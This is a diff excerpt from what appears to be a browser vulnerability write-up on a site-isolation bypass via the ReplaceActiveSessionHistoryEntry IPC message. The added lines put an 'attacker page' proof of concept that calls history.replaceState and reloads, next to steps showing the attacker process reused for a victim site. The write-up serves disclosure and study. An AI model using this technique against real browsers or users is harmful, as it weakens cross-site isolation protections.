@@ -24,6 +24,22 @@ By sending a `ReplaceActiveSessionHistoryEntry` IPC message with the cross-site 
     - in `about:processes` we can observe the attacker process being reused for the victim site
     - observe that the title of the tab that the victim page is loaded in, still shows the URL of the attacker website
 
+```html
+<!-- attacker page --->
+<html>
+  <body>
+    <h1>Attacker page</h1>
+
+    <script>
+      (async function () {
+        await window.history.replaceState("foo", "bar", null);
+        await window.location.reload();
+      })();
+    </script>
+  </body>
+</html>
+```
+
 ### Renderer Patch
 
 ```cpp
